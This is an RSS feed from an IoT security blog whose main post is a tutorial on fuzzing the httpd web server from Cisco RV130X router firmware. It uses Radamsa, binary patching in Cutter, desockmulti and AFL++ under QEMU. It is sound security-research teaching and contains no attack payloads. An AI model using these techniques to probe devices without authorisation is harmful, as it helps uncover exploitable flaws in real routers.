<?xml version="1.0" encoding="UTF-8"?>
<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title><![CDATA[Attify Blog - IoT Security, Pentesting and Exploitation ]]></title>
    <description><![CDATA[Internet of Things security, Embedded Device Exploitation, Reverse Engineering Training and Penetration Testing ]]></description>
    <link>https://blog.attify.com/</link>
    <image>
      <url>https://blog.attify.com/favicon.png</url>
      <title>Attify Blog - IoT Security, Pentesting and Exploitation </title>
      <link>https://blog.attify.com/</link>
    </image>
    <generator>Ghost 4.46</generator>
    <lastBuildDate>Tue, 03 May 2022 09:36:42 GMT</lastBuildDate>
    <atom:link href="https://blog.attify.com/rss/" rel="self" type="application/rss+xml" />
    <ttl>60</ttl>
    <item>
      <title><![CDATA[Fuzzing IoT binaries with AFL++ - Part II]]></title>
      <description><![CDATA[Fuzzing closed source IoT firmware binaries with AFL++ in Qemu mode. Fuzzing networked apps often requires desocketing and patching the binary.]]></description>
      <link>https://blog.attify.com/fuzzing-iot-binaries-with-afl-part-ii/</link>
      <guid isPermaLink="false">61dd4a12c82db7003b7e0f59</guid>
      <category><![CDATA[iot]]></category>
      <category><![CDATA[firmware]]></category>
      <category><![CDATA[fuzzing]]></category>
      <category><![CDATA[IoT Exploitation]]></category>
      <category><![CDATA[afl]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Wed, 26 Jan 2022 05:45:02 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2022/01/titleimage2.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2022/01/titleimage2.png" alt="Fuzzing IoT binaries with AFL++ - Part II"><p>In the <a href="https://blog.attify.com/fuzzing-iot-devices-part-1/">previous part</a>, we looked at fuzzing simple IoT binaries with AFL++. These programs accepted input from a file and were straightforward to fuzz. </p><p>In this post, we will be looking at socket&apos;ed binaries. Fuzzing binaries that communicate over the network using sockets are different from fuzzing binaries that use file-based I/O. Vanilla AFL and AFL++ don&#x2019;t support fuzzing socket&apos;ed binaries although there have been projects such as <a href="https://github.com/aflnet/aflnet">AFLNet</a> and <a href="https://github.com/LyleMi/aflnw">AFLNW</a> which use modified versions of AFL for the same. Here however, we will see how to use plain AFL++ to fuzz network programs. The <code>httpd</code> binary at <code>/usr/sbin/httpd</code> is the web server for the firmware and can be used as a candidate for fuzzing.</p><p>We can launch <code>httpd</code> with <code>sudo</code> as shown. Sudo is needed to bind on port 80.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-17.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1570" height="109" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-17.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-17.png 1000w, https://blog.attify.com/content/images/2022/01/image-17.png 1570w" sizes="(min-width: 720px) 720px"></figure><p>Note that qemu is started from within the <code>www/</code> directory as this is where the web resources (html, css, js files) are. Although it shows a bind error, running <code>netstat</code> confirms that <code>httpd</code> is indeed listening on port 80.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-18.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1388" height="211" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-18.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-18.png 1000w, https://blog.attify.com/content/images/2022/01/image-18.png 1388w" sizes="(min-width: 720px) 720px"></figure><p>We can open <em>http://127.0.0.1</em> to cross-check that the web interface is accessible.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-19.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1061" height="837" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-19.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-19.png 1000w, https://blog.attify.com/content/images/2022/01/image-19.png 1061w" sizes="(min-width: 720px) 720px"></figure><p>The web interface can also be accessed using <code>curl</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-20.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1600" height="373" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-20.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-20.png 1000w, https://blog.attify.com/content/images/2022/01/image-20.png 1600w" sizes="(min-width: 720px) 720px"></figure><p>Using an intercepting proxy such as Burp Suite, we can view the actual HTTP requests that are being sent. Trying to login to the dashboard with the credentials <code>admin:123456</code> results in a POST request as shown.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-21.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1326" height="548" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-21.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-21.png 1000w, https://blog.attify.com/content/images/2022/01/image-21.png 1326w" sizes="(min-width: 720px) 720px"></figure><p>In the image above we are running the webserver over port 8080 (rather than 80) &#xA0;by appending <em><code>-p 8080</code></em> to the qemu command line.</p><p>From here on, the idea is to modify this base request using the fuzzer in subtle ways such that it crashes the web server. </p><p>The naive way is to send actual requests over the network. However, this would be slow. The smarter and recommended way is to make the webserver read the HTTP request data from a file. We will look at both ways.</p><h2 id="naive-fuzzing-using-radamsa">Naive fuzzing using Radamsa</h2><p><a href="https://gitlab.com/akihe/radamsa">Radamsa</a> is not a fuzzer. It&apos;s a test case generator that reads in a file and modifies it in subtle ways. How to use the modified output is up to us. Here we will send the output from the file to the running web server.</p><pre><code class="language-python"># fuzz-radamsa.py
import socket
import pyradamsa
 
base_login_request = open(&quot;base-login-request.txt&quot;, &quot;rb&quot;).read()
 
rad = pyradamsa.Radamsa()
i = j = 0
 
while True:
    # Create a modified request based on the base request
    fuzzed_request = rad.fuzz(base_login_request)
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    # 1 second timeout
    sock.settimeout(1)
 
    sock.connect((&quot;127.0.0.1&quot;, 8080))
 
    j += 1
    print(f&quot;[+] Request {j} - &quot;, end=&quot;&quot;)
 
    sock.sendall(fuzzed_request)
    try:
            sock.recv(50000)
        print(&quot;OK&quot;)
    except Exception as ex:
            i += 1
            open(f&quot;interesting/{i}.txt&quot;, &quot;wb&quot;).write(fuzzed_request)
            print(f&quot; {ex} -&gt; saved to {i}.txt&quot;)
       sock.close()</code></pre><p>The code above uses Radamsa to generate modified request data using the base login request. This data is then sent over the socket to the webserver running at port 8080. If the server doesn&#x2019;t respond within 1 second, the input is saved to a file in the interesting directory.</p><p>We can run the fuzzer as shown.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-22.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1070" height="527" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-22.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-22.png 1000w, https://blog.attify.com/content/images/2022/01/image-22.png 1070w" sizes="(min-width: 720px) 720px"></figure><p>Request 3 timed out while responding and the corresponding input was saved to <em>1.txt</em>. Note that a timeout is not the same as a crash. Had the server crashed on request 3, further requests wouldn&#x2019;t be successful. Fuzzing this way is highly inefficient, slow, and error-prone and would often lead to false positives.</p><h2 id="fuzzing-with-afl">Fuzzing with AFL++</h2><p>As discussed before, to fuzz with AFL, the program must accept input from a file. We do not have the source code of <em>httpd</em> which we can modify for our purpose. Hence we have to resort to binary level modifications, such as patching the assembly instructions and <code>LD_PRELOAD</code> tricks. Using the latter we can override network functions in <code>libc</code> to make them accept input from a file instead. The <a href="https://github.com/zyingp/desockmulti">desockmulti</a> project on GitHub can be used for this purpose.</p><p>Before showing how to use <em>desockmulti,</em> we need to make a few modifications of our own. The <code>httpd</code> binary currently forks to the background using the <a href="https://man7.org/linux/man-pages/man3/daemon.3.html"><code>daemon</code></a> function. We do not want this forking behavior during fuzzing.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-23.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="610" height="193" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-23.png 600w, https://blog.attify.com/content/images/2022/01/image-23.png 610w"></figure><p>We need to override <code>daemon</code> such that it returns 0 without forking actually. This can be done both with LD_PRELOAD or patching the assembly instructions.</p><p>The other change that we need to make is to have <em>httpd</em> process exactly 1 request (unlike a typical web server that processes requests indefinitely) before quitting. This way we can know which request, if any, crashes the web server.</p><p>To close a socket, <code>httpd</code> calls the <code><a href="https://man7.org/linux/man-pages/man2/close.2.html">close</a></code> function. There are three locations from where close is called.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-24.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1015" height="193" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-24.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-24.png 1000w, https://blog.attify.com/content/images/2022/01/image-24.png 1015w" sizes="(min-width: 720px) 720px"></figure><p>Among them, we need to modify the one at <code>231c0</code> to call <code>exit(0)</code> instead of <code>close</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-25.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="999" height="151" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-25.png 600w, https://blog.attify.com/content/images/2022/01/image-25.png 999w" sizes="(min-width: 720px) 720px"></figure><p>To patch the instructions we will use <a href="https://cutter.re/">Cutter</a> which is a GUI for <a href="https://github.com/radareorg/radare2">radare2</a>. Ghidra also supports patching binaries but Cutter is better suited for this use case.</p><p>Navigating to <code>0x231c0</code> in Cutter, we come across the following disassembly.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-26.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="830" height="90" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-26.png 600w, https://blog.attify.com/content/images/2022/01/image-26.png 830w" sizes="(min-width: 720px) 720px"></figure><p>Double-clicking on <code>close</code> takes us to <code>0x106b4</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-27.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="569" height="173"></figure><p>The <code>exit</code> function is located at <code>0x10b64</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-28.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="537" height="202"></figure><p>We can thus change <code>bl close</code> to <code>bl 0x10b64</code> to call the <code>exit</code> function instead.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-29.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="553" height="241"></figure><p>The instruction immediately before can be changed from <code>mov r0, sl</code> to <code>eor r0, r0</code> which sets register <code>r0</code> to <code>0</code> to give us the following disassembly.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-30.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="780" height="97" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-30.png 600w, https://blog.attify.com/content/images/2022/01/image-30.png 780w" sizes="(min-width: 720px) 720px"></figure><p>The net effect is that it calls <code>exit(0)</code>. &#xA0;The other change we need to do is patch out the <code>daemon</code> call at <code>0x22CB4</code>.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-31.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="550" height="95"></figure><p>We can change the instruction to <code>eor r0, r0</code> to make the application believe the call succeeded.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-32.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="445" height="94"></figure><p>Finally, with the changes in place go to File -&gt; Commit changes to save the modifications. Let&apos;s rename the file to <em>httpd_patched.</em></p><h2 id="testing-patched-httpd">Testing patched httpd</h2><p>Running <em>httpd_patched </em>we can see that it doesn&#x2019;t fork to the background.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-33.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1600" height="338" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-33.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-33.png 1000w, https://blog.attify.com/content/images/2022/01/image-33.png 1600w" sizes="(min-width: 720px) 720px"></figure><p>Additionally, it quits after processing a single request as shown below.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-34.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="1600" height="679" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-34.png 600w, https://blog.attify.com/content/images/size/w1000/2022/01/image-34.png 1000w, https://blog.attify.com/content/images/2022/01/image-34.png 1600w" sizes="(min-width: 720px) 720px"></figure><h2 id="setting-up-desockmulti">Setting up desockmulti</h2><p>We need to use an ARM cross compiler to compile <em>desockmulti</em>. The <a href="https://toolchains.bootlin.com/">armv7-eabihf-uclibc</a> toolchain from bootlin works great for this purpose. We need to use a uclibc based toolchain as the firmware binaries also use the same. Running the file command on <em>/usr/bin/httpd</em> points out the binary is dynamically linked to <em>ld-uClibc</em>.</p><pre><code class="language-shell">$ file usr/sbin/httpd
usr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI4 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</code></pre><p>Before compiling <em>desockmulti</em>, we have to make a tiny change to its source.</p><pre><code class="language-diff">$ git diff
diff --git a/desockmulti.c b/desockmulti.c
index 719e6ac..6bcc223 100644
--- a/desockmulti.c
+++ b/desockmulti.c
@@ -450,7 +450,7 @@ int socket(int domain, int type, int protocol)
                pthread_mutex_unlock(&amp;mutex);
        }
 
-       setup_timer();
+       //setup_timer();
 
        if ((fd = original_socket(AF_UNIX, SOCK_STREAM, 0)) &lt; 0) {
                perror(&quot;socket error&quot;);</code></pre><p>In <em>desockmulti.c</em> there&#x2019;s a call to a <code>setup_timer</code> function that needs to be commented out as shown in the diff above.</p><p>We can then run make specifying the bath to the arm-linux-gcc compiler in the <code>CC</code> environment variable.</p><pre><code class="language-shell">$ make CC=~/armv7-eabihf--uclibc--stable-2020.08-1/bin/arm-linux-gcc      </code></pre><p>The generated file <em>desockmulti.so</em> can be copied to the <em>squashfs-root</em> directory.</p><h2 id="testing-desockmulti">Testing desockmulti</h2><p>To test that <em>desockmulti</em> is indeed working as expected we can debug <em>httpd</em> with <em>gdb-multiarch</em>. First, we need to add a dependency to the library <em>libpthread.so.0</em> using <em>patchelf</em>. Patchelf can be installed using apt. This is necessary as <em>desockmulti </em>uses threads while <em>httpd</em> doesn&#x2019;t link to <em>libpthread</em> by default.</p><pre><code class="language-shell">$ patchelf --add-needed ./lib/libpthread.so.0 ./usr/sbin/httpd_patched</code></pre><p>In terminal 1, run the binary in qemu specifying the -g parameter.</p><pre><code class="language-shell">ubuntu@binwalk:~/cisco/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ sudo qemu-arm-static -g 5555 -L .. -E USE_RAW_FORMAT=1 -E LD_PRELOAD=../desockmulti.so ../usr/sbin/httpd_patched
-p 8080 &lt; ../../base-login-request.txt</code></pre><p>The path to <em>desockmulti.so</em> is specified in the <code>LD_PRELOAD</code> environment variable. The other variable <code>USE_RAW_FORMAT</code> is specific to <em>desockmulti</em>.</p><p>In another terminal, we can start <em>gdb-multiarch</em>, set a breakpoint on <code>fprintf</code> and attach to port 5555.</p><pre><code class="language-shell">$ gdb-multiarch -q ./usr/sbin/httpd
GEF for linux ready, type `gef&apos; to start, `gef config&apos; to configure
95 commands loaded for GDB 9.2 using Python engine 3.8
[*] 1 command could not be loaded, run `gef missing` to know why.
Reading symbols from ./usr/sbin/httpd...
(No debugging symbols found in ./usr/sbin/httpd)
gef&#x27A4;  b fprintf
Breakpoint 1 at 0x10a38
gef&#x27A4;  target remote :5555
&#x2026;
gef&#x27A4;  c</code></pre><p>When the breakpoint on <code>fprintf</code> hits we can press c and continue for a couple of times to finally inspect the contents of the register <code>r2</code>.</p><pre><code class="language-shell">0xfffe5fa8&#x2502;+0x0018: 0x30303220  &#x2192;  0x30303220
0xfffe5fac&#x2502;+0x001c: 0x0d6b4f20  &#x2192;  0x0d6b4f20
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500; code:arm:ARM &#x2500;&#x2500;&#x2500;&#x2500;
   0xff4eb7b8 &lt;fprintf+4&gt;      push   {lr}              ; (str lr,  [sp,  #-4]!)
   0xff4eb7bc &lt;fprintf+8&gt;      add    r2,  sp,  #8
   0xff4eb7c0 &lt;fprintf+12&gt;     ldr    r1,  [sp,  #4]
 &#x2192; 0xff4eb7c4 &lt;fprintf+16&gt;     bl     0xff4ee024 &lt;vfprintf&gt;
   &#x21B3;  0xff4ee024 &lt;vfprintf+0&gt;     push   {r4,  r5,  r6,  r7,  r8,  lr}
      0xff4ee028 &lt;vfprintf+4&gt;     mov    r5,  r0
      0xff4ee02c &lt;vfprintf+8&gt;     ldr    r6,  [r0,  #76]        ; 0x4c
      0xff4ee030 &lt;vfprintf+12&gt;    ldr    r12,  [pc,  #144]      ; 0xff4ee0c8 &lt;vfprintf+164&gt;
      0xff4ee034 &lt;vfprintf+16&gt;    cmp    r6,  #0
      0xff4ee038 &lt;vfprintf+20&gt;    add    r12,  pc,  r12
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500; arguments (guessed) &#x2500;&#x2500;&#x2500;&#x2500;
vfprintf (
   $r0 = 0x000be3c0 &#x2192; 0xff006085 &#x2192; 0xff006085,
   $r1 = 0x00093f5c &#x2192; 0x00007325 &#x2192; 0x00007325,
   $r2 = 0xfffe5f98 &#x2192; 0xfffe5fa0 &#x2192; 0x50545448 &#x2192; 0x50545448,
   $r3 = 0x000006c8 &#x2192; 0x000006c8
)
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500; threads &#x2500;&#x2500;&#x2500;&#x2500;
[#0] Id 1, stopped 0xff4eb7c4 in fprintf (), reason: BREAKPOINT
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500; trace &#x2500;&#x2500;&#x2500;&#x2500;
[#0] 0xff4eb7c4 &#x2192; fprintf()
[#1] 0x1dd5c &#x2192; add sp,  sp,  #1004      ; 0x3ec
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
gef&#x27A4;  x/s *$r2
0xfffe5fa0:     &quot;HTTP/1.1 200 Ok\r\n&quot;</code></pre><p>R2 points to a readable string &quot;HTTP/1.1 200 Ok\r\n&quot; which is the first line of a typical HTTP response. This indicates that <em>desockmulti</em> is working. We are not able to see the HTTP response on-screen but nevertheless it&apos;s working as intended. </p><p>At this point we can start fuzzing <em>httpd_patched</em> however, we can further make quality of life improvements. For example, the binary requires root to run. It prints the following error message if started without root.</p><pre><code class="language-shell">ubuntu@binwalk:~/cisco/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ qemu-arm-static -L .. -E USE_RAW_FORMAT=1 -E LD_PRELOAD=../desockmulti.so ../usr/sbin/httpd_patched -p 8080 &lt; ../../base-login-request.txt
===&gt;HTTPD : scheduler set RR with proirity = 99 FAILED
--- [1640588459:322474] accept_num=1, connect_num=0
--- [1640588459:323006] Get pkt, sockindex=0, length=943, pkt[0]=80
+++ [1640588459:323333] Intercepted socket()! original type=AF_INET6 fd=4
--- [1640588459:323785] preeny socket bound, Emulating bind on port 8080
--- [1640588459:324011] preeny listen called, accepting connections ...
--- [1640588459:324223] preeny connect_write for serverfd=4 started
--- [1640588459:324466] preeny connect succeeds, write for serverfd=4, client sock index=0
--- [1640588459:324778] preeny write a 943 bytes packet, client socket index = 0, client sockfd=5
--- [1640588459:325074] preeny connection for serverfd=4 client sockfd=5 shutdown
--- [1640588459:325151] pthread_created or directly called for preeny_connect_write, accept_done_num 1, selected_fd_index 0  
+++ [1640588459:325246] Intercepted socket()! original type=AF_INET6 fd=6
--- [1640588459:325334] preeny socket bound, Emulating bind on port 8080
--- [1640588459:325393] preeny listen called, accepting connections ...
+++ [1640588459:325488] Intercepted socket()! original type=AF_INET fd=7
--- [1640588459:325725] preeny socket bound, Emulating bind on port 8080
--- [1640588459:325747] preeny listen called, accepting connections ...
+++ [1640588459:325976] Intercepted socket()! original type=AF_INET fd=8
--- [1640588459:326095] preeny socket bound, Emulating bind on port 81       
--- [1640588459:326118] preeny listen called, accepting connections ...      
+++ [1640588459:326480] Intercepted socket()! original type=AF_INET6 fd=9    
--- [1640588459:329767] preeny socket bound, Emulating bind on port 81       
--- [1640588459:329820] preeny listen called, accepting connections ...      
/var/run/httpd.pid: Permission denied
+++ [1640588459:330676] shutting down desockmulti...
+++ [1640588459:330844] ... shutdown complete!</code></pre><p>It fails on trying to access <em>/var/run/httpd.pid</em>. We can patch the binary and change the path to something which doesn&#x2019;t require root privilege to access. This can be done using a hex editor and also with Cutter.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-35.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="949" height="972" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-35.png 600w, https://blog.attify.com/content/images/2022/01/image-35.png 949w" sizes="(min-width: 720px) 720px"></figure><p>We can change <em>/var/run/httpd.pid</em> to <em>/home/ubuntu/h.pid</em> and save. The new path is located under the home directory and can be accessed without root. It&#x2019;s also important to note the length of the replacement string must be less than or equal to the original.</p><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-36.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="953" height="229" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-36.png 600w, https://blog.attify.com/content/images/2022/01/image-36.png 953w" sizes="(min-width: 720px) 720px"></figure><p>Rerunning <em>httpd_patched</em> we can see it doesn&#x2019;t show the permission denied error anymore.</p><pre><code class="language-shell">ubuntu@binwalk:~/cisco/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ qemu-arm-static -L .. -E USE_RAW_FORMAT=1 -E LD_PRELOAD=../desockmulti.so ../usr/sbin/httpd_patched -p 8080 &lt; ../../base-login-request.txt
===&gt;HTTPD : scheduler set RR with proirity = 99 FAILED
--- [1640594090:533269] accept_num=1, connect_num=0
--- [1640594090:533738] Get pkt, sockindex=0, length=943, pkt[0]=80
+++ [1640594090:533930] Intercepted socket()! original type=AF_INET6 fd=4
--- [1640594090:534277] preeny socket bound, Emulating bind on port 8080
--- [1640594090:534400] preeny listen called, accepting connections ...
--- [1640594090:534562] preeny connect_write for serverfd=4 started
--- [1640594090:534704] preeny connect succeeds, write for serverfd=4, client sock index=0
--- [1640594090:534880] preeny write a 943 bytes packet, client socket index = 0, client sockfd=5
--- [1640594090:535045] preeny connection for serverfd=4 client sockfd=5 shutdown
--- [1640594090:535144] pthread_created or directly called for preeny_connect_write, accept_done_num 1, selected_fd_index 0
+++ [1640594090:535228] Intercepted socket()! original type=AF_INET6 fd=6
--- [1640594090:535283] preeny socket bound, Emulating bind on port 8080
--- [1640594090:535316] preeny listen called, accepting connections ...
+++ [1640594090:535359] Intercepted socket()! original type=AF_INET fd=7
--- [1640594090:535389] preeny socket bound, Emulating bind on port 8080
--- [1640594090:535404] preeny listen called, accepting connections ...
+++ [1640594090:535432] Intercepted socket()! original type=AF_INET fd=8
--- [1640594090:535478] preeny socket bound, Emulating bind on port 81
--- [1640594090:535511] preeny listen called, accepting connections ...
+++ [1640594090:535559] Intercepted socket()! original type=AF_INET6 fd=9
--- [1640594090:535601] preeny socket bound, Emulating bind on port 81
--- [1640594090:535632] preeny listen called, accepting connections ...
--- [1640594090:537111] Accept socket at serverfd=4, got fd=10, accept_sock_num=1.
+++ [1640594090:550073] shutting down desockmulti...
+++ [1640594090:550229] ... shutdown complete!</code></pre><p>Additionally, the file <em>h.pid</em> is created within the user&apos;s home directory.</p><pre><code class="language-shell">$ ls -la /home/ubuntu/h.pid
-rw-rw-r-- 1 ubuntu ubuntu 4 Dec 27 08:34 /home/ubuntu/h.pid</code></pre><h2 id="fuzzing-httpd">Fuzzing httpd</h2><p>We can now finally proceed to fuzz the patched <em>httpd</em> binary. We need to create two directories: <em>input-httpd</em> and <em>output-httpd</em>. The former will contain the file <em>base-login-request.txt</em> which AFL++ will use to generate further test cases.</p><pre><code class="language-shell">ubuntu@fuzz:~/_RV130X_FW_1.0.3.55.bin.extracted/squashfs-root/www$ QEMU_LD_PREFIX=.. QEMU_SET_ENV=USE_RAW_FORMAT=1,LD_PRELOAD=../desockmulti.so ../../../AFLplusplus/afl-fuzz -Q -i ../../input-httpd/ -o ../../output-httpd/ -- ../usr/sbin/httpd_patched -p 8080</code></pre><figure class="kg-card kg-image-card"><img src="https://blog.attify.com/content/images/2022/01/image-37.png" class="kg-image" alt="Fuzzing IoT binaries with AFL++ - Part II" loading="lazy" width="801" height="582" srcset="https://blog.attify.com/content/images/size/w600/2022/01/image-37.png 600w, https://blog.attify.com/content/images/2022/01/image-37.png 801w" sizes="(min-width: 720px) 720px"></figure><p>We can leave the fuzzer as is to continue fuzzing. To quit press Ctrl+C anytime. In our brief test, AFL++ wasn&#x2019;t able to crash the application.</p><p>With this, we come to the end of the two-part AFL fuzzing series. In the first part, we saw how to fuzz simple binaries which accepted input from a file. They required no modifications and were straightforward to fuzz. In this part, we learned how to convert a socketed binary to accept input from a file instead. This required patching the binary on an assembly level and using LD_PRELOAD further to override libc functions. We also saw how to use radamsa to generate test cases as a crude way to fuzz. There is no universal technique that can be applied as-is to fuzz any given closed IoT firmware binary. It will vary on a case-by-case basis but the idea is similar. For any comments, questions or suggestions feel free to leave a comment below.</p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Fuzzing IoT binaries with AFL++ - Part I]]></title>
      <description><![CDATA[Fuzzing closed source IoT firmware binaries with AFL++ in Qemu mode. Fuzzing networked apps often requires desocketing and patching the binary.]]></description>
      <link>https://blog.attify.com/fuzzing-iot-devices-part-1/</link>
      <guid isPermaLink="false">61d3ffcba399f3003bb529ed</guid>
      <category><![CDATA[iot]]></category>
      <category><![CDATA[firmware]]></category>
      <category><![CDATA[fuzzing]]></category>
      <category><![CDATA[IoT Exploitation]]></category>
      <category><![CDATA[afl]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Thu, 13 Jan 2022 06:26:58 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2022/01/titleimage.png" medium="image" />
